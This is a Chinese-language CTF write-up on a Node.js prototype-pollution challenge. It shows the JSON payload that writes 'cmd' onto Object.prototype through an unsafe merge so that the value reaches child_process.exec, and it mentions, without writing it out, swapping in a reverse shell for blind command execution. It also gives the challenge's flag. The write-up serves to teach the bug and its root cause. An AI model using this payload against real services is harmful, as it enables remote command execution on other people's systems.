# week3dont_pollute_me

## 题目简述

Node.js 服务提供 `/gotit` 和 `/time` 两个接口。前者用自定义 `merge` 函数把 JSON 请求体递归合并到普通对象，后者用 `for...in` 遍历命令对象并交给 `/bin/bash` 执行。合并逻辑允许写入 `Object.prototype`，而命令遍历又会读取继承的可枚举属性，二者组合形成原型链污染到命令执行的利用链。

## 解题过程

`user` 是普通对象，所以 `"__proto__" in user` 为真。提交带有 `__proto__` 的 JSON 后，`merge(user, client)` 会递归进入 `user.__proto__`，即 `Object.prototype`，再把 `cmd` 写成其可枚举属性：

```http
POST /gotit HTTP/1.1
Content-Type: application/json

{"__proto__":{"cmd":"id"}}
```

访问 `/time` 时，源码先创建：

```javascript
let time = { cmd1: "uptime" };
for (let cmd in time) {
    exec(time[cmd], { shell: "/bin/bash" });
}
```

`for...in` 不只枚举 `time` 自身的 `cmd1`，还会枚举从 `Object.prototype` 继承的 `cmd`，于是污染值被送入 `child_process.exec`。把 `id` 换成反弹 Shell 或其他带外回显命令，再请求一次 `/time`，即可获得盲命令执行。题目容器中的 flag 位于：

```text
/usr/local/share/doc/node/flag
```

读取后得到：

```text
0xGame{pr0totype_pu1luti0n_G5eat_dan3er0us}
```

## 方法总结

漏洞成立需要两个条件同时满足：不安全递归合并允许 `__proto__` 下沉到全局对象原型，后续安全敏感代码又用 `for...in` 信任继承属性。仅污染属性不会自动产生 RCE，真正的危险点是污染值最终流入 `exec`。此外，源码中的清理循环遍历的是 `Object.keys(...)` 数组的索引，并没有按属性名可靠删除污染项，不能阻止该利用链。
